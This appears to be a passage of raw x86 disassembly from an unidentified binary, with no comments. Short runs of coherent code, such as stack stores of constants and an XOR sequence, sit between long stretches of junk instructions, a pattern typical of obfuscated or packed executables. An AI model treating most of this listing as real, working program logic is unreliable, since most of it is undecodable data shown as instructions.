  4111d5:	mov    DWORD PTR [ebp-0xbc],0x43cc
  4111df:	jmp    0x411454
  4111e4:	mov    ecx,0x1c975440
  4111e9:	jnp    0x41119d
  4111eb:	push   ds
  4111ec:	jl     0x41125d
  4111ee:	mov    esi,DWORD PTR [eax-0x24]
  4111f1:	xchg   esi,eax
  4111f2:	dec    edi
  4111f3:	jle    0x4111e3
  4111f5:	jl     0x41120f
  4111f7:	sbb    BYTE PTR [ecx+0x14],dh
  4111fa:	sbb    BYTE PTR [eax],bl
  4111fc:	outs   dx,BYTE PTR ds:[esi]
  4111fd:	call   0xc78d09f9
  411202:	add    DWORD PTR [eax],edx
  411204:	(bad)  
  411205:	mov    dl,0x1b
  411207:	or     ebp,DWORD PTR [ebx]
  411209:	push   esp
  41120a:	or     al,0x6b
  41120c:	pop    es
  41120d:	addr16 mov edi,0x22e9bc3b
  411213:	inc    ebx
  411214:	add    DWORD PTR [esi],ebx
  411216:	popf   
  411217:	repz clc 
  411219:	mov    gs,esp
  41121b:	das    
  41121c:	test   eax,0x829f728c
  411221:	dec    eax
  411222:	mov    al,ds:0xe270484f
  411227:	fmul   st(2),st
  411229:	dec    edx
  41122a:	jmp    0x8463c3e8
  41122f:	shl    edi,0xe2
  411232:	daa    
  411233:	in     eax,0x2e
  411235:	xor    al,0x78
  411237:	scas   eax,DWORD PTR es:[edi]
  411238:	xchg   esi,eax
  411239:	in     eax,0xf
  41123b:	pop    DWORD PTR [esi+0x13794948]
  411241:	push   edx
  411242:	push   ebx
  411243:	imul   esp,edx,0x20a1aecb
  411249:	aas    
  41124a:	cmp    eax,0xeaeee307
  41124f:	and    dh,BYTE PTR [eax+0x54]
  411252:	imul   eax,DWORD PTR [ecx],0xd233bfd1
  411258:	push   ss
  411259:	mov    es,WORD PTR [eax]
  41125b:	cmp    ah,BYTE PTR [edi+0x9]
  41125e:	call   0xf422:0xb20c804a
  411265:	cdq    
  411266:	rol    DWORD PTR [ecx],cl
  411268:	mov    edx,DWORD PTR [eax-0x3d]
  41126b:	ror    DWORD PTR gs:[ecx],0x8
  41126f:	or     eax,0xaf39a0ae
  411274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411275:	adc    al,0x67
  411277:	shr    BYTE PTR [edx],0xa4
  41127a:	cmp    BYTE PTR [ecx+ebx*1-0x39b95e5d],bl
  411281:	stc    
  411282:	xchg   ebp,eax
  411284:	push   edx
  411285:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411286:	and    eax,0x9e8e0292
  41128b:	mov    ecx,0x329ddb54
  411290:	inc    eax
  411291:	mov    ebp,0xf301bc7f
  411296:	test   ecx,eax
  411298:	ins    BYTE PTR es:[edi],dx
  411299:	push   edi
  41129a:	retf   
  41129b:	cmp    DWORD PTR cs:[eax],0xffffffb5
  41129f:	jbe    0x4112f9
  4112a1:	cwde   
  4112a2:	pop    edi
  4112a3:	add    ebx,DWORD PTR [ebx]
  4112a5:	repnz test DWORD PTR [esp+esi*8-0x58],esi
  4112aa:	out    dx,al
  4112ab:	mov    eax,ds:0xce1174a6
  4112b0:	icebp  
  4112b1:	xchg   esi,eax
  4112b2:	push   esp
  4112b3:	cs scas eax,DWORD PTR es:[edi]
  4112b5:	sar    BYTE PTR [edx+0x28b8a657],0xf5
  4112bc:	shl    dl,1
  4112be:	xchg   DWORD PTR ds:0xc5fc2e61,ecx
  4112c4:	adc    eax,esp
  4112c6:	cli    
  4112c7:	inc    ebp
  4112c8:	xchg   ecx,eax
  4112c9:	add    BYTE PTR [edi],dh
  4112cb:	call   0x2e33:0xcdee14f2
  4112d2:	shl    ebx,cl
  4112d4:	adc    bl,cl
  4112d6:	int3   
  4112d7:	repz jno 0x411264
  4112da:	cdq    
  4112db:	repnz cmc 
  4112dd:	shl    BYTE PTR [esi+edx*4],1
  4112e0:	add    BYTE PTR [eax+0x67a33529],ch
  4112e6:	add    ah,BYTE PTR [eax]
  4112e8:	sub    dh,BYTE PTR [ebx+0x768e4439]
  4112ee:	push   eax
  4112ef:	mov    eax,0x921cde1c
  4112f4:	(bad)  
  4112f5:	dec    eax
  4112f6:	pusha  
  4112f7:	adc    eax,ecx
  4112f9:	bound  edi,QWORD PTR [eax+0x45592fd1]
  4112ff:	js     0x411330
  411301:	(bad)  
  411302:	fistp  QWORD PTR [edi]
  411304:	inc    edi
  411305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411306:	add    esp,ebp
  411308:	jge    0x41134b
  41130a:	daa    
  41130b:	pop    es
  41130c:	jmp    0x4112a2
  41130e:	aam    0xe4
  411310:	xlat   BYTE PTR ds:[ebx]
  411311:	cld    
  411312:	rcr    al,cl
  411314:	shl    DWORD PTR [esi+0x47],cl
  411317:	imul   ebp,DWORD PTR [esi-0x318ac903],0xfd58efaf
  411321:	pusha  
  411322:	cmp    DWORD PTR [ecx],0x26
  411325:	std    
  411326:	cdq    
  411327:	xlat   BYTE PTR ds:[ebx]
  411328:	mov    eax,ds:0xc74474c5
  41132d:	jmp    0x2967:0x6a906eb1
  411334:	and    eax,0xe43d8491
  411339:	push   ebp
  41133a:	mov    ds:0x5894a393,eax
  41133f:	popa   
  411340:	fidiv  WORD PTR ds:[eax]
  411343:	add    ah,BYTE PTR [ebp+0x53]
  411346:	in     eax,dx
  411347:	pop    ebp
  411348:	xchg   esi,eax
  411349:	mov    bl,0xe1
  41134b:	mov    esp,0xbe548cfb
  411350:	call   0x8cea536
  411355:	jle    0x4113c0
  411357:	mov    ch,0x5a
  411359:	and    al,0x78
  41135b:	pop    esi
  41135c:	fdiv   QWORD PTR [esi]
  41135e:	fnstcw WORD PTR [eax]
  411360:	jo     0x4113cf
  411362:	rcr    bh,0x6f
  411365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411366:	sbb    cl,BYTE PTR [ebx]
  411368:	pushf  
  411369:	paddb  mm2,mm0
  41136c:	ins    BYTE PTR es:[edi],dx
  41136d:	in     eax,dx
  41136e:	daa    
  41136f:	lea    esi,[edi+0x43]
  411372:	stos   DWORD PTR es:[edi],eax
  411373:	bound  esp,QWORD PTR [eax-0x41]
  411376:	(bad)  
  411377:	push   edx
  411378:	adc    ch,bh
  41137a:	push   es
  41137b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41137c:	aaa    
  41137d:	(bad)  
  41137e:	mov    dl,0x99
  411380:	cmp    bl,dh
  411382:	dec    eax
  411383:	loope  0x411338
  411385:	mov    ah,0xd1
  411387:	xor    ah,0xe1
  41138a:	loop   0x4113d8
  41138c:	inc    edx
  41138d:	jecxz  0x411379
  41138f:	outs   dx,DWORD PTR ds:[esi]
  411390:	out    0x4f,eax
  411392:	dec    edi
  411393:	jg     0x411341
  411395:	mov    WORD PTR [eax-0x3845c7f8],gs
  41139b:	or     BYTE PTR [ebx+0x72],cl
  41139e:	sbb    BYTE PTR [ecx-0x4b],cl
  4113a1:	add    al,0xa0
  4113a3:	popf   
  4113a4:	mov    dh,0x9
  4113a6:	sbb    eax,0xa7488b6f
  4113ab:	pop    edi
  4113ac:	bound  edx,QWORD PTR [ecx+eiz*8+0x72]
  4113b0:	xchg   esp,eax
  4113b1:	xchg   BYTE PTR [edx-0x361e77d8],ah
  4113b7:	lea    esp,[ecx]
  4113b9:	sbb    edi,ebx
  4113bb:	add    al,0x47
  4113bd:	aaa    
  4113be:	dec    esi
  4113bf:	pushf  
  4113c0:	or     DWORD PTR [edi+0x3f],0xffffff99
  4113c4:	adc    BYTE PTR [ebp-0x8],ah
  4113c7:	(bad)  
  4113c8:	sbb    al,0xc5
  4113ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113cb:	sbb    al,BYTE PTR [ebx+0x37]
  4113ce:	pop    edx
  4113cf:	or     esp,DWORD PTR [ebx]
  4113d1:	rol    BYTE PTR [eax-0x80],0x41
  4113d5:	ret    
  4113d6:	das    
  4113d7:	out    dx,al
  4113d8:	adc    DWORD PTR ds:0xae134af4,ebp
  4113de:	xchg   ecx,eax
  4113df:	arpl   sp,bx
  4113e1:	stos   BYTE PTR es:[edi],al
  4113e2:	mov    edx,0x4b97de8b
  4113e7:	dec    eax
  4113e8:	fbld   TBYTE PTR [edi+0x7d]
  4113eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113ec:	ret    
  4113ed:	xchg   ebx,eax
  4113ee:	pop    es
  4113ef:	pushf  
  4113f0:	dec    ecx
  4113f1:	popf   
  4113f2:	pop    eax
  4113f3:	(bad)  
  4113f4:	je     0x4113f8
  4113f6:	jmp    0x247d:0xc48334db
  4113fd:	xchg   ebx,esp
  4113ff:	daa    
  411400:	daa    
  411401:	pop    ebx
  411402:	or     bl,BYTE PTR [eax+0x55e31ccd]
  411408:	leave  
  411409:	jns    0x4113ed
  41140b:	(bad)  
  41140c:	fnstsw WORD PTR [esi]
  41140e:	jle    0x4113e4
  411410:	and    esp,DWORD PTR [esi]
  411412:	xchg   ecx,eax
  411413:	push   0xffffffec
  411415:	sub    ebx,DWORD PTR [esi-0x78e05b71]
  41141b:	stos   BYTE PTR es:[edi],al
  41141c:	cmp    esi,ebp
  41141e:	push   esp
  41141f:	or     bh,BYTE PTR [edx]
  411421:	lods   al,BYTE PTR ds:[esi]
  411422:	test   eax,0xb6c133dc
  411427:	jg     0x41146f
  411429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41142a:	out    0xaa,eax
  41142c:	inc    ecx
  41142d:	mov    dh,0xbb
  411430:	mov    esp,0x32a44fe6
  411435:	les    ebp,FWORD PTR [edx+0x37]
  411438:	adc    DWORD PTR [edi+eax*8],eax
  41143b:	mov    bh,0x10
  41143d:	ret    
  41143e:	mov    ?,WORD PTR [esi]
  411440:	repnz add DWORD PTR [ebp-0x3b],edi
  411444:	fisttp WORD PTR [edi-0x7b]
  411447:	or     al,0x6d
  411449:	imul   ebp
  41144b:	or     DWORD PTR [edx-0x17ea34ac],ebx
  411451:	ja     0x411437
  411453:	dec    edx
  411454:	mov    DWORD PTR [ebp-0xb0],0x7564
  41145e:	mov    DWORD PTR [ebp-0xac],0x18cf
  411468:	mov    DWORD PTR [ebp-0xa0],0x3135
  411472:	mov    DWORD PTR [ebp-0x9c],0x568d
  41147c:	mov    DWORD PTR [ebp-0x90],0x11f2
  411486:	mov    DWORD PTR [ebp-0x8c],0x63ea
  411490:	mov    DWORD PTR [ebp-0x10],0x3066
  411497:	mov    DWORD PTR [ebp-0x8],0x6ed2
  41149e:	push   0x7e1d
  4114a3:	jmp    0x411718
  4114a8:	dec    edi
  4114a9:	sub    bl,BYTE PTR [edx+0x3b209ab0]
  4114af:	sub    dl,BYTE PTR [eax-0x7581de78]
  4114b5:	daa    
  4114b6:	hlt    
  4114b7:	push   0x47
  4114b9:	js     0x4114d3
  4114bb:	sbb    BYTE PTR [ecx+0x14],dh
  4114be:	sbb    BYTE PTR [eax],bl
  4114c0:	mov    dh,0x27
  4114c2:	jnp    0x4114ec
  4114c4:	es pop ss
  4114c6:	int    0xbf
  4114c8:	or     al,0xaf
  4114ca:	mov    ah,0x8d
  4114cc:	sbb    ecx,esp
  4114ce:	push   0x9f49bc8c
  4114d3:	push   0x67fe1222
  4114d8:	sbb    eax,0xc46caf4d
  4114dd:	ins    BYTE PTR es:[edi],dx
  4114de:	pop    esi
  4114df:	fistp  WORD PTR [edx-0x15]
  4114e2:	daa    
  4114e3:	rcr    DWORD PTR [eax+0x63],cl
  4114e6:	pop    ds
  4114e7:	repnz xchg ecx,eax
  4114e9:	inc    edi
  4114ea:	or     DWORD PTR ds:0x9b400aca,edi
  4114f0:	loop   0x4114b6
  4114f2:	sub    al,0x73
  4114f4:	shl    ecx,1
  4114f6:	jge    0x411525
  4114f8:	jae    0x4114b0
  4114fa:	xor    BYTE PTR [eax],bh
  4114fc:	xchg   ebx,eax
  4114fd:	sub    eax,0x4641c5a8
  411502:	test   eax,0xd2dd9734
  411507:	leave  
  411508:	mov    DWORD PTR [ebp-0x55],ecx
  41150b:	jmp    0x8922:0x5b5e5a9d
  411512:	fld    TBYTE PTR [edi+0x42b25940]
  411518:	dec    edi
  411519:	jbe    0x4114bc
  41151b:	sub    bl,BYTE PTR [esi+edx*1+0x3f]
  41151f:	jmp    0x411592
  411521:	mov    al,0xad
  411523:	add    esp,DWORD PTR [edx+ebx*1-0x6914748]
  41152a:	call   0x5241:0xc0702076
  411531:	arpl   WORD PTR [ecx-0x37a5cd3b],dx
  411537:	add    eax,0xc0cc5585
  41153c:	lods   eax,DWORD PTR ds:[esi]
  41153d:	mov    al,ds:0xd4ad6c65
  411542:	into   
  411543:	dec    ebx
  411544:	les    esi,FWORD PTR [edx+eax*2+0x72]
  411548:	pop    edx
  411549:	push   edx
  41154a:	sbb    dl,BYTE PTR [edi+0x40af17f6]
  411550:	fsub   st(4),st
  411552:	pop    ss
  411553:	mov    dh,0x3
  411555:	fs cs test eax,0xf36b580b
  41155c:	lds    ecx,FWORD PTR [esi+0x1d2e5fed]
  411562:	or     BYTE PTR [ecx],bl
  411564:	fmul   QWORD PTR [ebp-0x31]
  411567:	jecxz  0x411516
  411569:	lds    ecx,FWORD PTR ds:0xda57562d
  41156f:	ins    BYTE PTR es:[edi],dx
  411570:	mov    BYTE PTR [edx+eax*1+0x29],bh
  411574:	outs   dx,DWORD PTR ds:[esi]
  411575:	or     BYTE PTR [ecx+0x39],bh
  411578:	fmul   st,st(2)
  41157a:	mov    dl,0xf2
  41157c:	lds    esi,FWORD PTR [edx+0x19d83a0a]
  411582:	inc    ebx
  411583:	ins    DWORD PTR es:[edi],dx
  411584:	adc    dl,cl
  411586:	sub    BYTE PTR [eax-0x70],0x4b
  41158a:	jns    0x4115ee
  41158c:	xchg   ecx,eax
  41158d:	mov    al,0xb
  41158f:	or     esi,DWORD PTR cs:[edi-0xbf0911]
  411596:	stos   DWORD PTR es:[edi],eax
  411597:	dec    ecx
  411598:	mov    ebp,0x8e695baa
  41159d:	mov    edx,0xe44cc7be
  4115a2:	cld    
  4115a3:	call   DWORD PTR [eax+0x32]
  4115a6:	push   ebp
  4115a7:	(bad)  
  4115a8:	cmp    BYTE PTR [esi+0x1c3bd4],dh
  4115ae:	mov    BYTE PTR [ebx+edi*8],bl
  4115b1:	push   edi
  4115b2:	aas    
  4115b3:	mov    ds,eax
  4115b5:	int3   
  4115b6:	bound  eax,QWORD PTR cs:[edx+0x7e]
  4115ba:	jns    0x4115a8
  4115bc:	in     al,0x5e
  4115be:	jb     0x4115fb
  4115c0:	jle    0x41155a
  4115c2:	adc    DWORD PTR [ebx+0x3c],ebx
  4115c5:	pop    esp
  4115c6:	sar    bl,0x65
  4115c9:	push   esi
  4115ca:	cmp    DWORD PTR [esi-0x6c],eax
  4115cd:	clc    
  4115ce:	mov    dl,0x17
  4115d0:	push   edi
  4115d1:	cmp    cl,BYTE PTR ds:0xe06a8111
  4115d7:	adc    al,0xc7
  4115d9:	retf   0x1fc8
  4115dc:	mov    al,BYTE PTR [ebp+0x6312ea9b]
  4115e2:	repnz xor dl,0xcc
  4115e6:	cmp    al,0x23
  4115e8:	popf   
  4115e9:	loope  0x4115c4
  4115eb:	inc    edi
  4115ec:	(bad)
  4115ef:	jne    0x411612
  4115f1:	(bad)  
  4115f2:	sbb    dh,BYTE PTR [edi]
  4115f4:	dec    ecx
  4115f5:	mov    bh,0x6a
  4115f7:	fisttp WORD PTR [eax]
  4115f9:	call   0xcecf205
  4115fe:	jl     0x411630
  411600:	aad    0x63
  411602:	mov    ch,0xec
  411604:	push   ss
  411605:	fist   WORD PTR [ebx-0x258938b2]
  41160b:	sub    al,0x2f
  41160d:	fcomp  st(3)
  41160f:	mov    ebp,0xb0c157b2
  411614:	or     DWORD PTR [ebp+0x4be8f6f8],0x50060cf2
  41161e:	call   edx
  411620:	fwait
  411621:	cmp    edi,eax
  411623:	(bad)  
  411624:	addr16 fcom st(7)
  411627:	sbb    BYTE PTR [esi+0x34],ch
  41162a:	or     BYTE PTR [edi],0x2a
  41162d:	xchg   ecx,eax
  41162e:	dec    edx
  41162f:	jne    0x41161d
  411631:	jmp    0x411646
  411633:	hlt    
  411634:	pop    esi
  411635:	adc    eax,0x8c8d7f49
  41163a:	push   ecx
  41163b:	pushf  
  41163c:	sbb    BYTE PTR [edi+0x2571b11f],0x41
  411643:	stos   DWORD PTR es:[edi],eax
  411644:	mov    bl,BYTE PTR [edx]
  411646:	and    BYTE PTR [ebp+0x52],bh
  411649:	or     DWORD PTR [ebx-0x39],edi
  41164c:	inc    ebp
  41164d:	or     eax,0x1dd6ab98
  411652:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411653:	pop    eax
  411654:	(bad)  
  411655:	pop    edi
  411656:	push   esp
  411657:	sub    esp,DWORD PTR [eax+eax*1-0x6c953be2]
  41165e:	cmp    ah,dh
  411660:	aam    0xf1
  411662:	sub    dl,BYTE PTR [esi]
  411664:	xor    al,dh
  411666:	icebp  
  411667:	or     al,0x7e
  411669:	xchg   ebx,eax
  41166a:	or     DWORD PTR [ecx-0x74],ebp
  41166d:	fs mov bl,0xe8
  411670:	sub    al,0xb5
  411672:	stos   BYTE PTR es:[edi],al
  411673:	add    al,BYTE PTR [eax+0x5b]
  411676:	inc    ecx
  411677:	jle    0x4115fe
  411679:	push   0x20beaa3b
  41167e:	inc    ebp
  41167f:	sbb    esp,DWORD PTR [ebp*1+0x1e530d30]
  411686:	jo     0x411650
  411688:	(bad)  [esi-0x42107887]
  41168e:	cmp    al,0x58
  411690:	out    0x23,al
  411692:	call   0xa5e18137
  411697:	scas   eax,DWORD PTR es:[edi]
  411698:	lock jecxz 0x411647
  41169b:	cdq    
  41169c:	mov    bl,BYTE PTR [eax+0x3ba30873]
  4116a2:	aad    0xd6
  4116a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116a5:	adc    al,0x97
  4116a7:	repnz sub al,0xba
  4116aa:	sbb    eax,0x71ab0a2e
  4116af:	les    edi,FWORD PTR [ecx+0x14fa8c6]
  4116b5:	ss cli 
  4116b7:	rcr    DWORD PTR [ecx+0x441904fb],cl
  4116bd:	stc    
  4116be:	jne    0x4116c7
  4116c0:	lods   eax,DWORD PTR ds:[esi]
  4116c1:	add    bh,0xf
  4116c4:	push   ecx
  4116c5:	test   BYTE PTR [ecx],bh
  4116c7:	neg    BYTE PTR [edx]
  4116c9:	sub    ebx,edx
  4116cb:	sub    DWORD PTR [edi+0x7451f12c],esi
  4116d1:	nop
  4116d2:	loopne 0x4116e7
  4116d4:	cmp    eax,0x88ac50e
  4116d9:	xor    edx,DWORD PTR [ecx+0x55fc4d21]
  4116df:	sti    
  4116e0:	lds    esi,FWORD PTR [eax+0xc]
  4116e3:	addr16 int3 
  4116e5:	out    dx,al
  4116e6:	es mul cl
  4116e9:	push   ecx
  4116ea:	mov    esi,0x38c36a34
  4116ef:	add    ah,BYTE PTR [esi-0x53efff34]
  4116f5:	shl    eax,0xed
  4116f8:	repz ficomp WORD PTR [edx+0x3d142180]
  4116ff:	into   
  411700:	test   eax,0xb34b534a
  411705:	jg     0x41175c
  411707:	mov    bl,0x43
  411709:	pop    ebx
  41170a:	dec    ebx
  41170b:	fxch   st(7)
  41170d:	mov    cl,0x5c
  41170f:	cld    
  411710:	ins    DWORD PTR es:[edi],dx
  411711:	repnz adc ebx,DWORD PTR [esi-0x7c]
  411715:	push   ds
  411716:	xor    dh,BYTE PTR [esi-0x39]
  411719:	inc    ebp
  41171a:	cld    
  41171b:	hlt    
  41171c:	xor    BYTE PTR [eax],al
  41171e:	add    BYTE PTR [ebx+0x4d8be045],cl
  411724:	in     al,0x68
  411726:	adc    BYTE PTR [ebx+0x0],0x0
  41172a:	push   ecx
  41172b:	push   eax
  41172c:	call   0x416c20
  411731:	mov    ecx,eax
  411733:	mov    eax,DWORD PTR [ebp-0x30]
  411736:	xor    ecx,eax
  411738:	mov    esi,edx
  41173a:	mov    edx,DWORD PTR [ebp-0x2c]
  41173d:	mov    eax,DWORD PTR [ebp-0x40]
  411740:	xor    esi,edx
  411742:	jmp    0x4119b7
  411747:	lds    edi,FWORD PTR [ecx]
  411749:	fisubr WORD PTR [ebp+0x5a]
  41174c:	sbb    al,BYTE PTR [edx+0x21]
  41174f:	pusha  
  411750:	mov    al,ds:0x4f78aa57
  411755:	outs   dx,DWORD PTR ds:[esi]
  411756:	mov    al,0x9e
  411758:	je     0x411772
  41175a:	sbb    BYTE PTR [ecx+0x14],dh
  41175d:	sbb    BYTE PTR [eax],bl
  41175f:	inc    eax
  411760:	push   es
  411761:	jae    0x411792
  411763:	out    0x60,eax
  411765:	daa    
  411766:	test   eax,0xfcf87bdc
  41176b:	stos   BYTE PTR es:[edi],al
  41176c:	mov    eax,ds:0xadf26533
  411771:	pushf  
  411772:	iret   
  411773:	mov    ah,0x3e
  411775:	sbb    dh,ch
  411777:	sub    eax,0x380174db
  41177c:	fbstp  TBYTE PTR [ebp+0x58175555]
  411782:	add    esp,DWORD PTR [edi]
  411784:	mov    eax,0x482c0cee
  411789:	sbb    BYTE PTR [ecx-0x38],0xe4
  41178d:	xlat   BYTE PTR ds:[ebx]
  41178e:	ret    
  41178f:	shr    BYTE PTR [eax+0x3e],cl
  411792:	push   edx
  411793:	mov    esp,0xaa7115e9
  411798:	mov    eax,0x1fe6afbf
  41179d:	adc    eax,0x16a61632
  4117a2:	or     BYTE PTR [esi+esi*1],ah
  4117a5:	jbe    0x4117b0
  4117a7:	mov    ebx,0x42b17acc
  4117ac:	inc    ebp
  4117ad:	inc    esp
  4117ae:	js     0x411775
  4117b0:	inc    eax
  4117b1:	icebp  
  4117b2:	xor    eax,0x89b44a14
  4117b7:	sub    al,0x23
  4117b9:	(bad)  
  4117ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117bb:	and    edi,esp
  4117bd:	mov    edx,0x63944fc2
  4117c2:	jbe    0x4117e3
  4117c4:	stos   BYTE PTR es:[edi],al
  4117c5:	retf   0x4fd
  4117c8:	mov    ebp,0xddca0c52
  4117cd:	xor    ebx,ecx
  4117cf:	mov    esp,0x3022b433
  4117d4:	and    ah,al
  4117d6:	push   es
  4117d7:	or     cl,0x65
  4117da:	sbb    al,0x6a
  4117dc:	das    
  4117dd:	test   DWORD PTR [esi-0x66],esi
  4117e0:	and    bl,BYTE PTR [edi-0x63]
  4117e3:	push   cs
  4117e4:	xor    cl,BYTE PTR [edx+0x2c]
  4117e7:	fisubr WORD PTR [edi-0x3c20701d]
  4117ed:	js     0x411842
  4117ef:	jnp    0x411855
  4117f1:	test   BYTE PTR [edx+0x140e787e],dl
  4117f7:	loope  0x4117be
  4117f9:	ret    0x9161
  4117fc:	adc    ecx,ebp
  4117fe:	sbb    ah,cl
  411800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411801:	mov    ?,WORD PTR [ebp+0xf0c5ec2]
  411807:	shr    BYTE PTR [ebx-0x1af34b6d],cl
  41180d:	add    BYTE PTR [esi+eax*8-0x57],cl
  411811:	pop    eax
  411812:	xchg   esi,eax
  411813:	sti    
  411814:	cmp    dl,BYTE PTR [eax]
  411816:	mov    esp,0xe909fbd0
  41181b:	stos   DWORD PTR es:[edi],eax
  41181c:	xor    al,0xcc
  41181e:	scas   al,BYTE PTR es:[edi]
  41181f:	leave  
  411820:	lods   al,BYTE PTR ds:[esi]
  411821:	in     al,dx
  411822:	jbe    0x41182a
  411824:	(bad)  
  411825:	ss mov ebx,0x530252a6
  41182b:	jmp    0x411878
  41182d:	mov    esi,0xc9f26b47
  411832:	lods   al,BYTE PTR ds:[esi]
  411833:	mov    eax,ds:0x5a1bd8a3
  411838:	or     DWORD PTR [edx],edx
  41183a:	(bad)  
  41183b:	push   0xffffff86
  41183d:	inc    ebp
  41183e:	ror    BYTE PTR [ebp+0x46],0x55
  411842:	ror    DWORD PTR [ebx],1
  411844:	push   es
  411845:	jmp    0x6f26:0x80c2ea47
  41184c:	mov    BYTE PTR [ebx],cl
  41184e:	clc    
  41184f:	cli    
  411850:	ret    0x2aa2
  411853:	pop    edx
  411854:	xchg   esi,eax
  411855:	clc    
  411856:	shl    bl,cl
  411858:	je     0x41182c
  41185a:	cld    
  41185b:	bound  edi,QWORD PTR [eax-0x6e24a90b]
  411861:	sub    DWORD PTR [ebx-0x222b2922],0x8074fc8c
  41186b:	xlat   BYTE PTR ds:[ebx]
  41186c:	jb     0x411882
  41186e:	push   ds
  41186f:	dec    ebx
  411870:	loopne 0x4118bd
  411872:	mov    BYTE PTR [edx],0x3
  411875:	push   ds
  411876:	xor    eax,edi
  411878:	into   
  411879:	outs   dx,DWORD PTR ds:[esi]
  41187a:	pop    ebx
  41187b:	cmp    eax,0x5de6d31a
  411880:	cmp    al,0x49
  411882:	jge    0x4118f5
  411884:	or     ecx,eax
  411886:	ins    BYTE PTR es:[edi],dx
  411887:	dec    ebp
  411888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411889:	mov    cl,0xed
  41188b:	pop    esp
  41188c:	call   0xbfa510d1
  411891:	cmp    al,0x21
  411893:	jns    0x41185e
  411895:	jge    0x41182e
  411897:	pop    ebx
  411898:	(bad)  
  411899:	jns    0x41189e
  41189b:	sub    al,0x6a
  41189d:	pop    ds
  41189e:	cmp    ecx,DWORD PTR [eax+edi*4+0x548e0fda]
  4118a5:	pushf  
  4118a6:	dec    eax
  4118a7:	shr    DWORD PTR [ebp+0x1aab010c],1
  4118ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118ae:	test   BYTE PTR [eax-0x570eac7],al
  4118b4:	shl    ebp,cl
  4118b6:	retf   0x7537
  4118b9:	es jle 0x41187c
  4118bc:	lds    ebp,FWORD PTR [ebp-0x6c]
  4118bf:	nop
  4118c0:	xchg   ebp,eax
  4118c1:	dec    ecx
  4118c2:	sbb    BYTE PTR [esi+ebp*8],dh
  4118c5:	shl    BYTE PTR [edx+0x40287a02],1
  4118cb:	stos   BYTE PTR es:[edi],al
  4118cc:	adc    al,0x9e
  4118ce:	(bad)  
  4118cf:	call   0xa2e0:0xa936f3e9
  4118d6:	pusha  
  4118d7:	cmp    al,0xcb
  4118d9:	gs jmp 0x6569:0xe4a467f2
  4118e1:	xchg   BYTE PTR [edi-0x2e],dl
  4118e4:	pop    esp
  4118e5:	dec    ecx
  4118e6:	in     al,0x3a
  4118e8:	mov    ecx,0x60e1296c
  4118ed:	pop    esi
  4118ee:	(bad)  
  4118ef:	dec    edi
  4118f1:	repz lock icebp 
  4118f4:	nop
  4118f5:	retf   0xc861
  4118f8:	push   ebp
  4118f9:	xchg   ebp,eax
  4118fa:	cld    
  4118fb:	jae    0x4118fe
  4118fd:	jnp    0x4118c6
  4118ff:	push   edi
  411900:	pushf  
  411901:	dec    edx
  411902:	aad    0x8
  411904:	or     eax,0x938a2146
  411909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41190a:	inc    esp
  41190b:	mov    ebx,0x77a8f18b
  411910:	xor    eax,eax
  411912:	xlat   BYTE PTR ds:[ebx]
  411913:	mov    ah,0xdc
  411915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411916:	mov    ebp,0x2373e5e5
  41191b:	imul   ebp,DWORD PTR [ecx-0x50fd4831],0xffffff89
  411922:	xor    BYTE PTR [edi],0xd4
  411925:	mov    BYTE PTR [ebp+0x1db93f01],bl
  41192b:	xlat   BYTE PTR ds:[ebx]
  41192c:	pop    ebx
  41192d:	fisttp DWORD PTR [ecx]
  41192f:	shr    BYTE PTR [ecx],cl
  411931:	int3   
  411932:	scas   al,BYTE PTR es:[edi]
  411933:	in     eax,dx
  411934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411935:	fcmove st,st(7)
  411937:	shl    dh,1
  411939:	(bad)  
  41193a:	cli    
  41193b:	xchg   esi,eax
  41193c:	enter  0xd58e,0xda
  411940:	adc    eax,0xd7695d30
  411945:	es push ecx
  411947:	mov    ds:0x922e1088,al
  41194c:	shl    ch,cl
  41194e:	sbb    ebx,DWORD PTR [edx+0x10]
  411951:	fsub   DWORD PTR [esi+0x6e]
  411954:	xor    esp,DWORD PTR [eax+0x57]
  411957:	fisttp WORD PTR es:[ecx]
  41195a:	lods   eax,DWORD PTR ds:[esi]
  41195b:	jg     0x411942
  41195d:	dec    ecx
  41195e:	test   BYTE PTR [ecx-0x62],dl
  411961:	adc    edx,DWORD PTR [edi-0x5d2491ac]
  411967:	xchg   ebx,eax
  411968:	or     BYTE PTR [ebx-0x40],dh
  41196b:	rol    DWORD PTR [edx],cl
  41196d:	fwait
  41196e:	fs cld 
  411970:	pop    esi
  411971:	mov    bl,0x89
  411973:	mov    edi,0x79188b68
  411978:	sbb    al,BYTE PTR [esi]
  41197a:	lods   eax,DWORD PTR ds:[esi]
  41197b:	mov    ebp,0x7e106498
  411980:	inc    edx
  411981:	push   edi
  411982:	sub    DWORD PTR [ebp+0x75],ebp
  411985:	or     al,0x7f
  411987:	(bad)  
  411988:	mov    cl,0x77
  41198a:	cli    
  41198b:	mov    ah,0x24
  41198d:	mov    BYTE PTR [eax+0x3d4b81f6],bl
  411993:	mov    WORD PTR [ebp+0x31b4a7a6],gs
  411999:	jbe    0x41198d
  41199b:	arpl   WORD PTR ss:[edx+0x12],bp
  41199f:	and    eax,0x934b05ad
  4119a4:	jge    0x4119b2
  4119a6:	pop    ebx
  4119a7:	push   cs
  4119a8:	xor    al,0x49
  4119aa:	outs   dx,BYTE PTR ds:[esi]
  4119ab:	scas   al,BYTE PTR es:[edi]
  4119ac:	aaa    
  4119ad:	fstp   TBYTE PTR [ebx-0x4eecdfa0]
